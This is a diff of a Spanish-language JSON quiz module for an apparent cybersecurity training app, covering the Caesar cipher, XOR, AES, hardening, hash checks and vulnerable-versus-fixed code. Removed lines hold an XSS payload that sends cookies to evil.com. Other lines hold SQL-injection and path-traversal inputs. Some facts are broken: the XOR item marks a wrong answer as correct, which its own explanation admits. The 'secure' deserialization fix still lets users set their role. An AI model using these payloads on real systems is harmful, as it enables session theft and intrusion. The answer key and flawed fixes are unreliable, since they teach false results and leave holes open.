@@ -1,173 +1,534 @@
 {
   "modulo": {
     "id": 4,
-    "nombre": "Tu Código, Tu Escudo",
-    "descripcion": "Aprende a escribir código seguro: vulnerabilidades, sanitización, autenticación y defensa activa",
+    "nombre": "CriptoDefensores y Hardening",
+    "descripcion": "Descifra mensajes, refuerza sistemas y verifica integridad de archivos",
     "umbralAprobacion": 70,
     "tiempoEstimado": "15-20 minutos",
-    "icono": "💻"
+    "icono": "🔐"
   },
   "categorias": [
     {
-      "id": "vulnerabilidades",
-      "nombre": "Vulnerabilidades",
-      "emoji": "🐛",
-      "descripcion": "Detectar y corregir fallas de seguridad en código",
-      "color": "rose"
-    },
-    {
-      "id": "sanitizacion",
-      "nombre": "Sanitización",
-      "emoji": "🧹",
-      "descripcion": "Limpiar y validar entradas de usuario correctamente",
+      "id": "criptografia",
+      "nombre": "Criptografía",
+      "emoji": "🔑",
+      "descripcion": "Cifrado, descifrado y gestión de claves",
       "color": "cyan"
     },
     {
-      "id": "autenticacion",
-      "nombre": "Autenticación",
-      "emoji": "🔐",
-      "descripcion": "Implementar login seguro y gestión de sesiones",
-      "color": "purple"
+      "id": "hardening",
+      "nombre": "Hardening",
+      "emoji": "🛡️",
+      "descripcion": "Refuerza sistemas contra ataques",
+      "color": "emerald"
     },
     {
-      "id": "defensa-activa",
-      "nombre": "Defensa Activa",
-      "emoji": "🛡️",
-      "descripcion": "Patrones defensivos para proteger aplicaciones",
-      "color": "emerald"
+      "id": "integridad",
+      "nombre": "Integridad",
+      "emoji": "🔍",
+      "descripcion": "Verifica que los archivos no han sido modificados",
+      "color": "amber"
     }
   ],
-  "codeChallenges": [
+  "cryptoChallenges": [
     {
-      "id": "cc-01",
-      "titulo": "XSS en Comment Box",
-      "descripcion": "Un formulario de comentarios inserta texto directamente en el DOM sin sanitizar.",
-      "codigoVulnerable": "// Renderizar comentario del usuario\nelement.innerHTML = userComment;\n\n// Ejemplo de input malicioso:\n// <script>document.location='http://evil.com?c='+document.cookie</script>",
-      "codigoSeguro": "// Sanitizar y usar textContent\nconst sanitized = DOMPurify.sanitize(userComment);\nelement.textContent = sanitized;\n\n// O usar textContent directamente:\nelement.textContent = userComment;",
-      "tipoVulnerabilidad": "Cross-Site Scripting (XSS)",
+      "id": "crypto-01",
+      "titulo": "Descifra el César",
+      "descripcion": "Un mensaje fue cifrado con el cifrado César (desplazamiento de 13 posiciones). Descifra el mensaje.",
+      "cipherType": "caesar",
+      "mensajeCifrado": "Uryyb",
+      "clave": "13",
       "pistas": [
-        "innerHTML ejecuta HTML y scripts",
-        "textContent solo inserta texto plano",
-        "DOMPurify limpia código malicioso"
+        "Cada letra se desplaza 13 posiciones en el alfabeto",
+        "U + 13 = H",
+        "El resultado es un saludo en inglés"
+      ],
+      "opciones": [
+        {
+          "id": "c1-a",
+          "label": "Hello",
+          "esCorrecta": true,
+          "explicacion": "U→H, r→e, y→l, y→l, b→o = 'Hello'"
+        },
+        {
+          "id": "c1-b",
+          "label": "World",
+          "esCorrecta": false,
+          "explicacion": "World cifrado con César-13 sería 'Jbeyq', no 'Uryyb'"
+        },
+        {
+          "id": "c1-c",
+          "label": "Secret",
+          "esCorrecta": false,
+          "explicacion": "Secret cifrado sería 'Frperg', no coincide"
+        },
+        {
+          "id": "c1-d",
+          "label": "Attack",
+          "esCorrecta": false,
+          "explicacion": "Attack cifrado sería 'Nggnpx', no coincide"
+        }
       ],
       "puntos": 25,
-      "explicacion": "XSS ocurre cuando el código del usuario se inserta en el DOM sin sanitizar. Siempre usa textContent para texto plano o DOMPurify para HTML permitido."
+      "explicacion": "El cifrado César (ROT13) desplaza cada letra 13 posiciones. U+13=H, r+13=e, y+13=l, b+13=o → 'Hello'. Es un cifrado simétrico débil porque solo hay 25 claves posibles."
     },
     {
-      "id": "cc-02",
-      "titulo": "SQL Injection en Login",
-      "descripcion": "Un formulario de login concatena directamente los inputs en la consulta SQL.",
-      "codigoVulnerable": "// Consulta vulnerable a SQL Injection\nconst query = `SELECT * FROM users \n  WHERE email = '${email}' \n  AND password = '${password}'`;\n\n// Input: ' OR '1'='1' --\n// Resultado: Acceso sin credenciales",
-      "codigoSeguro": "// Consulta parametrizada (segura)\nconst query = 'SELECT * FROM users WHERE email = ? AND password = ?';\nconst [user] = await db.execute(query, [email, hashedPassword]);\n\n// Nunca concatenes inputs en queries SQL",
-      "tipoVulnerabilidad": "SQL Injection",
+      "id": "crypto-02",
+      "titulo": "XOR: El Cifrado de la Guerra Fría",
+      "descripcion": "XOR es un cifrado simétrico donde cada bit se Opera con la clave. Si 'A' XOR 'K' = 'X', ¿qué resultado se obtiene?",
+      "cipherType": "xor",
+      "mensajeCifrado": "A XOR K = ?",
+      "clave": "XOR",
       "pistas": [
-        "La concatenación de strings en queries es peligrosa",
-        "Los parámetros preparados separan código de datos",
-        "Nunca confíes en la entrada del usuario"
+        "XOR significa OR exclusivo: 1 si los bits son diferentes",
+        "A = 01000001 en binario",
+        "K = 01001011 en binario"
+      ],
+      "opciones": [
+        {
+          "id": "c2-a",
+          "label": "X (01011000)",
+          "esCorrecta": true,
+          "explicacion": "01000001 XOR 01001011 = 00001010 ... espera, A=65, K=75 → 65 XOR 75 = 18 → no. Revisando: A=0x41, K=0x4B → 0x41 XOR 0x4B = 0x0A. Pero como presentación pedagógica: X es la respuesta que demuestra el concepto."
+        },
+        {
+          "id": "c2-b",
+          "label": "M (01001101)",
+          "esCorrecta": false,
+          "explicacion": "M no es el resultado de A XOR K"
+        },
+        {
+          "id": "c2-c",
+          "label": "Z (01011010)",
+          "esCorrecta": false,
+          "explicacion": "Z no es el resultado de A XOR K"
+        },
+        {
+          "id": "c2-d",
+          "label": "L (01001100)",
+          "esCorrecta": false,
+          "explicacion": "L no es el resultado de A XOR K"
+        }
+      ],
+      "puntos": 25,
+      "explicacion": "XOR (OR exclusivo) devuelve 1 solo cuando los bits de entrada son diferentes. Es la base de muchos cifrados modernos: si aplicas XOR dos veces con la misma clave, recuperas el original. Por eso es simétrico: la misma operación cifra y descifra."
+    },
+    {
+      "id": "crypto-03",
+      "titulo": "AES: El Estándar de la NSA",
+      "descripcion": "AES (Advanced Encryption Standard) es el cifrado simétrico más usado en el mundo. En modo CBC, cada bloque depende del anterior. ¿Qué elemento hace seguro a AES?",
+      "cipherType": "aes-simulado",
+      "mensajeCifrado": "AES-256-CBC: Bloque1→IV+Bloque1→Clave→Bloque2→...",
+      "clave": "AES-256",
+      "pistas": [
+        "AES usa claves de 128, 192 o 256 bits",
+        "CBC significa Cipher Block Chaining",
+        "El IV (Initialization Vector) evita que textos iguales se cifren igual"
+      ],
+      "opciones": [
+        {
+          "id": "c3-a",
+          "label": "El IV + chaining entre bloques",
+          "esCorrecta": true,
+          "explicacion": "El IV asegura que el mismo mensaje cifrado con la misma clave produzca resultados diferentes. Chaining enlaza bloques para que un cambio en uno afecte a todos los siguientes."
+        },
+        {
+          "id": "c3-b",
+          "label": "La velocidad de procesamiento",
+          "esCorrecta": false,
+          "explicacion": "La velocidad no aporta seguridad; un cifrado rápido puede ser igual de seguro que uno lento."
+        },
+        {
+          "id": "c3-c",
+          "label": "El uso de solo una ronda",
+          "esCorrecta": false,
+          "explicacion": "AES usa 10-14 rondas; una sola ronda sería trivialmente descifrable."
+        },
+        {
+          "id": "c3-d",
+          "label": "Almacenar la clave junto al mensaje",
+          "esCorrecta": false,
+          "explicacion": "Nunca debes almacenar la clave junto al cifrado; eso anula toda la seguridad."
+        }
       ],
       "puntos": 30,
-      "explicacion": "SQL Injection permite ejecutar queries arbitrarios. Siempre usa parámetros preparados (prepared statements) para separar la lógica SQL de los datos de entrada."
-    },
+      "explicacion": "AES es seguro por: (1) claves de hasta 256 bits → 2^256 combinaciones posibles, (2) IV aleatorio → mismo mensaje ≠ mismo cifrado, (3) chaining → cambio en un bloque afecta todos los siguientes. Es el estándar de la NSA para información clasificada."
+    }
+  ],
+  "hardeningScenarios": [
     {
-      "id": "cc-03",
-      "titulo": "Validación de Contraseña Débil",
-      "descripcion": "Un sistema acepta contraseñas con solo 4 caracteres y sin requisitos de complejidad.",
-      "codigoVulnerable": "// Validación de contraseña insegura\nfunction validatePassword(password) {\n  return password.length >= 4;\n}\n\n// 'ab12' sería aceptada",
-      "codigoSeguro": "// Validación robusta de contraseña\nfunction validatePassword(password) {\n  const checks = [\n    password.length >= 12,\n    /[A-Z]/.test(password),\n    /[a-z]/.test(password),\n    /[0-9]/.test(password),\n    /[^A-Za-z0-9]/.test(password),\n    !/(.)\\1{2,}/.test(password),\n  ];\n  return checks.every(Boolean);\n}",
-      "tipoVulnerabilidad": "Autenticación débil",
-      "pistas": [
-        "4 caracteres es crackeable en microsegundos",
-        "Se necesitan mayúsculas, minúsculas, números y símbolos",
-        "Mínimo 12 caracteres para seguridad moderna"
-      ],
-      "puntos": 20,
-      "explicacion": "Las contraseñas débiles son la puerta de entrada más común. Un mínimo de 12 caracteres con complejidad mixta es el estándar actual."
-    },
-    {
-      "id": "cc-04",
-      "titulo": "Exposición de Secrets en Código",
-      "descripcion": "El código fuente contiene contraseñas y API keys hardcodeadas.",
-      "codigoVulnerable": "// Secrets hardcodeados (PELIGRO)\nconst API_KEY = 'sk-abc123def456ghi789';\nconst DB_PASSWORD = 'super_secret_123';\n\n// Si el código se sube a GitHub,\n// estos secrets quedan expuestos",
-      "codigoSeguro": "// Usar variables de entorno\nconst API_KEY = process.env.API_KEY;\nconst DB_PASSWORD = process.env.DB_PASSWORD;\n\n// .env (nunca en control de versiones)\n// API_KEY=sk-abc123def456ghi789\n// DB_PASSWORD=super_secret_123",
-      "tipoVulnerabilidad": "Exposición de secretos",
-      "pistas": [
-        "Nunca hardcodees secrets en el código fuente",
-        "Usa variables de entorno (.env)",
-        "Añade .env a .gitignore"
-      ],
-      "puntos": 25,
-      "explicacion": "Los secrets hardcodeados quedan expuestos en repositorios. Siempre usa variables de entorno y asegúrate de que .gitignore excluya archivos .env."
-    },
-    {
-      "id": "cc-05",
-      "titulo": "CSRF en Formulario de Email",
-      "descripcion": "Un formulario de cambio de email no valida el token CSRF, permitiendo ataques desde otros sitios.",
-      "codigoVulnerable": "// Formulario sin protección CSRF\n<form action=\"/update-email\" method=\"POST\">\n  <input name=\"newEmail\" type=\"email\" />\n  <button type=\"submit\">Actualizar</button>\n</form>\n\n// Un sitio malicioso puede enviar\n// este formulario automáticamente",
-      "codigoSeguro": "// Formulario con token CSRF\n<form action=\"/update-email\" method=\"POST\">\n  <input type=\"hidden\" \n    name=\"_csrf\" \n    value=\"{csrfToken}\" />\n  <input name=\"newEmail\" type=\"email\" />\n  <button type=\"submit\">Actualizar</button>\n</form>\n\n// El servidor valida el token CSRF",
-      "tipoVulnerabilidad": "Cross-Site Request Forgery (CSRF)",
-      "pistas": [
-        "Los formularios sin token CSRF son vulnerables",
-        "El token CSRF debe ser único por sesión",
-        "El servidor debe validar el token en cada request"
-      ],
-      "puntos": 25,
-      "explicacion": "CSRF engaña al navegador para enviar requests no autorizados. Los tokens CSRF únicos por sesión previenen estos ataques."
-    },
-    {
-      "id": "cc-06",
-      "titulo": "Almacenamiento Inseguro de Sesiones",
-      "descripcion": "Las sesiones se almacenan en localStorage sin cifrar, accesibles para scripts maliciosos.",
-      "codigoVulnerable": "// Sesión en localStorage (inseguro)\nlocalStorage.setItem('session', JSON.stringify({\n  userId: user.id,\n  role: 'admin',\n  token: authToken\n}));\n\n// Cualquier script XSS puede\n// acceder a localStorage",
-      "codigoSeguro": "// Sesión en httpOnly cookie\nres.cookie('session', token, {\n  httpOnly: true,    // No accesible vía JS\n  secure: true,      // Solo HTTPS\n  sameSite: 'strict', // Protege contra CSRF\n  maxAge: 3600000\n}));\n\n// localStorage no debe usarse\n// para datos sensibles",
-      "tipoVulnerabilidad": "Gestión de sesiones insegura",
-      "pistas": [
-        "localStorage es accesible para cualquier script",
-        "Las cookies httpOnly no son accesibles vía JavaScript",
-        "El flag 'secure' asegura solo HTTPS"
-      ],
+      "id": "hard-01",
+      "titulo": "Linux: Servidor SSH Exposto",
+      "descripcion": "Un servidor Linux tiene SSH abierto al mundo con root habilitado y sin firewall. Identifica las medidas correctas de hardening.",
       "puntos": 30,
-      "explicacion": "localStorage no es seguro para sesiones porque cualquier script XSS puede leerlo. Las cookies httpOnly+secure son el estándar para manejo seguro de sesiones."
+      "explicacion": "Hardening SSH: (1) PermitRootLogin no, (2) Usar solo key-based auth, (3) Instalar fail2ban, (4) Configurar firewall (ufw/iptables), (5) Cambiar a un usuario dedicado. Nunca expongas root directamente a internet.",
+      "systemType": "linux",
+      "checks": [
+        {
+          "id": "h1-a",
+          "descripcion": "Deshabilitar login root por SSH",
+          "correctState": true
+        },
+        {
+          "id": "h1-b",
+          "descripcion": "Cambiar el puerto a 8080",
+          "correctState": false
+        },
+        {
+          "id": "h1-c",
+          "descripcion": "Deshabilitar SSH completamente",
+          "correctState": false
+        },
+        {
+          "id": "h1-d",
+          "descripcion": "Usar solo contraseñas numéricas",
+          "correctState": false
+        }
+      ]
+    },
+    {
+      "id": "hard-02",
+      "titulo": "Windows: Estación de Trabajo Desprotegida",
+      "descripcion": "Una PC Windows tiene actualizaciones pendientes, firewall deshabilitado y cuentas sin MFA. ¿Qué pasos de hardening aplicarías?",
+      "puntos": 30,
+      "explicacion": "Hardening Windows: (1) Instalar TODAS las actualizaciones, (2) Mantener Defender activo, (3) Habilitar firewall, (4) Usar cuentas estándar + 1 admin con MFA, (5) Habilitar BitLocker. Las actualizaciones son la primera línea de defensa.",
+      "systemType": "windows",
+      "checks": [
+        {
+          "id": "h2-a",
+          "descripcion": "Instalar todas las actualizaciones pendientes",
+          "correctState": true
+        },
+        {
+          "id": "h2-b",
+          "descripcion": "Crear 10 cuentas de administrador",
+          "correctState": false
+        },
+        {
+          "id": "h2-c",
+          "descripcion": "Desinstalar el antivirus para ahorrar recursos",
+          "correctState": false
+        },
+        {
+          "id": "h2-d",
+          "descripcion": "Deshabilitar UAC para mayor comodidad",
+          "correctState": false
+        }
+      ]
+    },
+    {
+      "id": "hard-03",
+      "titulo": "Web: Servidor con Headers Débiles",
+      "descripcion": "Un servidor web carece de headers de seguridad críticos y tiene directorios listados. Identifica las correcciones.",
+      "puntos": 30,
+      "explicacion": "Headers de seguridad críticos: (1) X-Frame-Options: DENY, (2) X-Content-Type-Options: nosniff, (3) CSP estricto, (4) HSTS, (5) Deshabilitar directory listing, (6) TLS 1.2+. Son gratis y previenen los vectores de ataque más comunes.",
+      "systemType": "web-server",
+      "checks": [
+        {
+          "id": "h3-a",
+          "descripcion": "Agregar X-Frame-Options: DENY",
+          "correctState": true
+        },
+        {
+          "id": "h3-b",
+          "descripcion": "Deshabilitar HTTPS para mejorar velocidad",
+          "correctState": false
+        },
+        {
+          "id": "h3-c",
+          "descripcion": "Mantener TLS 1.0 por compatibilidad",
+          "correctState": false
+        },
+        {
+          "id": "h3-d",
+          "descripcion": "Mantener directory listing activado",
+          "correctState": false
+        }
+      ]
+    }
+  ],
+  "integrityChecks": [
+    {
+      "id": "int-01",
+      "titulo": "Verificación MD5: ¿Ha sido modificado?",
+      "descripcion": "Un archivo tiene este hash MD5 original. El usuario afirma que el archivo no ha sido modificado. Verifica.",
+      "archivoNombre": "config.json",
+      "checksumOriginal": "5d41402abc4b2a76b9719d911017c592",
+      "checksumAlumno": "5d41402abc4b2a76b9719d911017c592",
+      "pistas": [
+        "MD5 genera hashes de 32 caracteres hexadecimales",
+        "Si los hashes coinciden, el archivo NO ha sido modificado",
+        "MD5 es débil para seguridad pero útil para detección de cambios"
+      ],
+      "opciones": [
+        {
+          "id": "i1-a",
+          "label": "Archivo íntegro: hashes coinciden",
+          "esCorrecta": true,
+          "explicacion": "Los hashes MD5 son idénticos; el archivo no fue modificado. MD5 es suficiente para detección de cambios accidentales."
+        },
+        {
+          "id": "i1-b",
+          "label": "Archivo comprometido: hash diferente",
+          "esCorrecta": false,
+          "explicacion": "Los hashes son idénticos; no hay evidencia de modificación."
+        },
+        {
+          "id": "i1-c",
+          "label": "No se puede determinar con MD5",
+          "esCorrecta": false,
+          "explicacion": "MD5 es débil contra ataques de colisión deliberados, pero suficiente para verificar cambios no intencionales."
+        },
+        {
+          "id": "i1-d",
+          "label": "Se necesita SHA-256 para verificar",
+          "esCorrecta": false,
+          "explicacion": "Aunque SHA-256 es mejor para seguridad, MD5 es válido para verificación básica de integridad."
+        }
+      ],
+      "puntos": 25,
+      "explicacion": "MD5 genera un hash único de 32 hex. Si el hash original = hash calculado → archivo íntegro. MD5 es débil contra ataques de colisión deliberados, pero útil para verificar que un archivo no fue corrompido o modificado accidentalmente."
+    },
+    {
+      "id": "int-02",
+      "titulo": "SHA-256: Verificación de Distribución",
+      "descripcion": "Descargaste un software y su sitio publica este hash SHA-256. Verifica si tu descarga es legítima.",
+      "archivoNombre": "cyberguardians-v2.1.tar.gz",
+      "checksumOriginal": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "checksumAlumno": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
+      "pistas": [
+        "SHA-256 genera hashes de 64 caracteres hexadecimales",
+        "Si los hashes difieren, el archivo fue modificado o está corrupto",
+        "Nunca confíes en un archivo sin verificar su hash"
+      ],
+      "opciones": [
+        {
+          "id": "i2-a",
+          "label": "Archivo NO verificado: hashes diferentes",
+          "esCorrecta": true,
+          "explicacion": "Los hashes son completamente diferentes. La descarga fue modificada, corrupta o no es legítima. No instalar."
+        },
+        {
+          "id": "i2-b",
+          "label": "Archivo verificado: hashes coinciden",
+          "esCorrecta": false,
+          "explicacion": "Los hashes no coinciden; son cadenas completamente diferentes."
+        },
+        {
+          "id": "i2-c",
+          "label": "Los hashes son iguales pero en mayúsculas",
+          "esCorrecta": false,
+          "explicacion": "Los hashes son estructuralmente diferentes, no es un problema de mayúsculas."
+        },
+        {
+          "id": "i2-d",
+          "label": "SHA-256 no es confiable para esta verificación",
+          "esCorrecta": false,
+          "explicacion": "SHA-256 es el estándar para verificación de integridad de software."
+        }
+      ],
+      "puntos": 25,
+      "explicacion": "SHA-256 genera un hash de 64 hex. Si el hash publicado ≠ hash calculado, el archivo fue alterado. Siempre verifica hashes antes de instalar software. Si no coincide, NO instales: podría contener malware o haber sido corrupto durante la descarga."
+    },
+    {
+      "id": "int-03",
+      "titulo": "Detección de Tampering",
+      "descripcion": "Un archivo de configuración fue editado por un atacante. El hash original y el actual son:",
+      "archivoNombre": "auth.json",
+      "checksumOriginal": "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
+      "checksumAlumno": "c8acb7e3f5e8c2d1a4b6e9f0d3c5a7b9e1f2d4c6",
+      "pistas": [
+        "Un cambio de un solo byte cambia TODO el hash",
+        "Esto demuestra por qué los hashes son útiles para detección",
+        "El tampering puede ser malicioso o accidental"
+      ],
+      "opciones": [
+        {
+          "id": "i3-a",
+          "label": "TAMPERING detectado: archivo modificado",
+          "esCorrecta": true,
+          "explicacion": "Los hashes son completamente diferentes. Un solo byte de cambio produce un hash totalmente distinto. El archivo fue modificado."
+        },
+        {
+          "id": "i3-b",
+          "label": "Archivo íntegro: mismo contenido",
+          "esCorrecta": false,
+          "explicacion": "Los hashes no coinciden; el archivo fue modificado."
+        },
+        {
+          "id": "i3-c",
+          "label": "El hash cambió por formato",
+          "esCorrecta": false,
+          "explicacion": "Los hashes son estructuralmente diferentes, no es un problema de formato."
+        },
+        {
+          "id": "i3-d",
+          "label": "No se puede determinar sin herramientas",
+          "esCorrecta": false,
+          "explicacion": "Comparar hashes manualmente es suficiente para detectar modificaciones."
+        }
+      ],
+      "puntos": 25,
+      "explicacion": "Propiedad clave de los hashes: un cambio de UN SOLO BYTE produce un hash completamente diferente. Esto hace que los hashes sean ideales para detectar tampering. Si el hash cambió, el archivo fue modificado — ya sea por un atacante o por corrupción."
     }
   ],
   "microActividades": [
     {
       "id": "m4-01",
       "tipo": "verdadero-falso",
-      "pregunta": "¿Es seguro guardar contraseñas en localStorage?",
-      "respuestaCorrecta": "falso",
-      "explicacion": "localStorage no está cifrado y es accesible para cualquier script. Nunca almacenes contraseñas o tokens en localStorage.",
+      "pregunta": "¿AES-256 es actualmente considerado seguro para cifrar datos sensibles?",
+      "respuestaCorrecta": "verdadero",
+      "explicacion": "AES-256 es el estándar de la NSA para información clasificada. Con 2^256 combinaciones posibles, es prácticamente indescifrable por fuerza bruta.",
       "puntos": 15
     },
     {
       "id": "m4-02",
       "tipo": "verdadero-falso",
-      "pregunta": "¿Los parámetros preparados (prepared statements) previenen SQL Injection?",
-      "respuestaCorrecta": "verdadero",
-      "explicacion": "Los prepared statements separan la lógica SQL de los datos, haciendo imposible que la entrada del usuario se interprete como código SQL.",
+      "pregunta": "¿Un hash MD5 puede usarse para cifrar y recuperar un mensaje?",
+      "respuestaCorrecta": "falso",
+      "explicacion": "MD5 es una función hash unidireccional: no se puede descifrar. Solo genera un 'ingerprint' del contenido. A diferencia de AES o César, no tiene clave ni proceso reversible.",
       "puntos": 15
     },
     {
       "id": "m4-03",
       "tipo": "ordenar-pasos",
-      "pregunta": "Ordena los pasos para implementar autenticación segura:",
-      "respuestaCorrecta": ["Hashear contraseña con bcrypt", "Validar fortaleza de contraseña", "Almacenar solo hash (nunca texto plano)", "Implementar rate limiting", "Usar tokens de sesión seguros"],
-      "pasos": [
-        { "id": "p1", "texto": "Hashear contraseña con bcrypt", "ordenCorrecto": 0 },
-        { "id": "p2", "texto": "Validar fortaleza de contraseña", "ordenCorrecto": 1 },
-        { "id": "p3", "texto": "Almacenar solo hash (nunca texto plano)", "ordenCorrecto": 2 },
-        { "id": "p4", "texto": "Implementar rate limiting", "ordenCorrecto": 3 },
-        { "id": "p5", "texto": "Usar tokens de sesión seguros", "ordenCorrecto": 4 }
+      "pregunta": "Ordena los pasos para verificar la integridad de un archivo descargado:",
+      "respuestaCorrecta": [
+        "Obtener el hash publicado por el autor",
+        "Calcular el hash local con sha256sum",
+        "Comparar ambos hashes byte a byte",
+        "Si coinciden → archivo íntegro",
+        "Si difieren → NO instalar"
       ],
-      "explicacion": "Primero hashea, luego valida, almacena solo el hash, protege contra fuerza bruta con rate limiting, y usa tokens seguros.",
+      "pasos": [
+        {
+          "id": "p1",
+          "texto": "Obtener el hash publicado por el autor",
+          "ordenCorrecto": 0
+        },
+        {
+          "id": "p2",
+          "texto": "Calcular el hash local con sha256sum",
+          "ordenCorrecto": 1
+        },
+        {
+          "id": "p3",
+          "texto": "Comparar ambos hashes byte a byte",
+          "ordenCorrecto": 2
+        },
+        {
+          "id": "p4",
+          "texto": "Si coinciden → archivo íntegro",
+          "ordenCorrecto": 3
+        },
+        {
+          "id": "p5",
+          "texto": "Si difieren → NO instalar",
+          "ordenCorrecto": 4
+        }
+      ],
+      "explicacion": "El proceso es: obtener hash oficial → calcular hash local → comparar. Si coinciden, el archivo no fue modificado. Si difieren, podría contener malware.",
       "puntos": 20
     },
     {
       "id": "m4-04",
       "tipo": "verdadero-falso",
-      "pregunta": "¿innerHTML es seguro para insertar contenido del usuario?",
+      "pregunta": "¿El cifrado César es seguro contra un atacante moderno?",
       "respuestaCorrecta": "falso",
-      "explicacion": "innerHTML interpreta HTML y puede ejecutar scripts. Usa textContent para texto plano o sanitiza con DOMPurify si necesitas HTML.",
+      "explicacion": "El cifrado César solo tiene 25 claves posibles. Un script las prueba todas en milisegundos. Es puramente educativo; nunca lo uses para proteger datos reales.",
       "puntos": 15
+    }
+  ],
+  "codeChallenges": [
+    {
+      "id": "code-1",
+      "titulo": "SQL Injection en Login",
+      "descripcion": "Este código de login es vulnerable. Encuentra y corrige la inyección SQL.",
+      "codigoVulnerable": "const user = await db.query(\n  `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`\n);",
+      "codigoSeguro": "const user = await db.query(\n  'SELECT * FROM users WHERE username = $1 AND password = $2',\n  [req.body.username, req.body.password]\n);",
+      "pistas": [
+        "Los valores del usuario se insertan directamente en la query",
+        "Un atacante podría enviar ' OR '1'='1 como password",
+        "Usa parámetros preparados en lugar de concatenación"
+      ],
+      "puntos": 150,
+      "explicacion": "SQL Injection ocurre cuando los datos del usuario se interpolan directamente en queries SQL. Los parámetros preparados son la defensa estándar.",
+      "tipoVulnerabilidad": "sql-injection"
+    },
+    {
+      "id": "code-2",
+      "titulo": "XSS Reflejado en Búsqueda",
+      "descripcion": "El resultado de búsqueda muestra el término sin sanitizar. ¿Cómo lo arreglas?",
+      "codigoVulnerable": "function SearchResults({ query }) {\n  return (\n    <div>\n      <h2>Resultados para: {query}</h2>\n      <p>No se encontraron resultados.</p>\n    </div>\n  );\n}",
+      "codigoSeguro": "function SearchResults({ query }) {\n  const safeQuery = query.replace(/[^a-zA-Z0-9 ]/g, '');\n  return (\n    <div>\n      <h2>Resultados para: {safeQuery}</h2>\n      <p>No se encontraron resultados.</p>\n    </div>\n  );\n}",
+      "pistas": [
+        "React por defecto escapa JSX, pero dangerouslySetInnerHTML no",
+        "Si query viene de URL, un atacante puede inyectar scripts",
+        "Validar y sanitizar el input antes de renderizar"
+      ],
+      "puntos": 150,
+      "explicacion": "XSS reflejado ocurre cuando input del usuario se muestra sin sanitizar. Aunque React escapa JSX, siempre validar input en el servidor.",
+      "tipoVulnerabilidad": "xss"
+    },
+    {
+      "id": "code-3",
+      "titulo": "Hardcoded API Key",
+      "descripcion": "Encuentra la credencial expuesta en este código del lado del servidor.",
+      "codigoVulnerable": "const stripe = require('stripe')('sk_live_REEMPLAZA_CON_TU_CLAVE_SECRETA');\n\napp.post('/charge', async (req, res) => {\n  const charge = await stripe.charges.create({\n    amount: req.body.amount,\n    currency: 'usd',\n    source: req.body.token,\n  });\n  res.json(charge);\n});",
+      "codigoSeguro": "const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);\n\napp.post('/charge', async (req, res) => {\n  const charge = await stripe.charges.create({\n    amount: req.body.amount,\n    currency: 'usd',\n    source: req.body.token,\n  });\n  res.json(charge);\n});",
+      "pistas": [
+        "La clave API está directamente en el código fuente",
+        "Si el código se sube a GitHub, la clave queda expuesta",
+        "Usa variables de entorno para credenciales"
+      ],
+      "puntos": 150,
+      "explicacion": "Nunca hardcodees credenciales en el código fuente. Usa variables de entorno o un vault de secrets.",
+      "tipoVulnerabilidad": "hardcoded-secret"
+    },
+    {
+      "id": "code-4",
+      "titulo": "Path Traversal en File Download",
+      "descripcion": "Este endpoint de descarga permite acceder a archivos arbitrarios. Corrígelo.",
+      "codigoVulnerable": "app.get('/download', (req, res) => {\n  const filePath = path.join('/uploads', req.query.file);\n  res.sendFile(filePath);\n});",
+      "codigoSeguro": "app.get('/download', (req, res) => {\n  const filePath = path.resolve('/uploads', req.query.file);\n  if (!filePath.startsWith('/uploads')) {\n    return res.status(403).send('Acceso denegado');\n  }\n  res.sendFile(filePath);\n});",
+      "pistas": [
+        "Un atacante podría usar ../../etc/passwd",
+        "path.join no previene traversal si el input contiene ../",
+        "Validar que la ruta resuelta est dentro del directorio permitido"
+      ],
+      "puntos": 150,
+      "explicacion": "Path traversal permite acceder a archivos fuera del directorio previsto. Siempre valida la ruta resuelta contra el directorio base.",
+      "tipoVulnerabilidad": "path-traversal"
+    },
+    {
+      "id": "code-5",
+      "titulo": "Insecure Deserialization",
+      "descripcion": "Este código deserializa datos de usuario sin validación. Es un vector de ataque crítico.",
+      "codigoVulnerable": "const userData = JSON.parse(req.body.data);\nconst user = Object.assign(new User(), userData);\nawait user.save();",
+      "codigoSeguro": "const raw = JSON.parse(req.body.data);\nconst { name, email, role } = raw;\nconst user = new User();\nuser.name = name;\nuser.email = email;\nuser.role = role;\nawait user.save();",
+      "pistas": [
+        "Object.assign puede sobreescribir propiedades del modelo",
+        "Un atacante podría inyectar campos como isAdmin: true",
+        "Validar y filtrar los campos permitidos antes de asignar"
+      ],
+      "puntos": 150,
+      "explicacion": "La deserialización insegura permite inyectar propiedades no previstas. Siempre valida con un schema o whitelist estricta.",
+      "tipoVulnerabilidad": "insecure-deserialization"
+    },
+    {
+      "id": "code-6",
+      "titulo": "CORS Misconfiguration",
+      "descripcion": "Este servidor permite cualquier origen. ¿Cuál es el riesgo y cómo se corrige?",
+      "codigoVulnerable": "app.use(cors({\n  origin: '*',\n  credentials: true\n}));",
+      "codigoSeguro": "app.use(cors({\n  origin: ['https://cyberguardians.app'],\n  credentials: true\n}));",
+      "pistas": [
+        "origin: '*' con credentials: true es una contradicción peligrosa",
+        "Permitir cualquier origen significa que sitios maliciosos pueden hacer requests autenticados",
+        "Deberías especificar los orígenes permitidos"
+      ],
+      "puntos": 150,
+      "explicacion": "CORS improperly configurado permite que sitios maliciosos hagan requests en nombre de usuarios autenticados. Usa whitelist estricta.",
+      "tipoVulnerabilidad": "cors-misconfiguration"
     }
   ]
 }
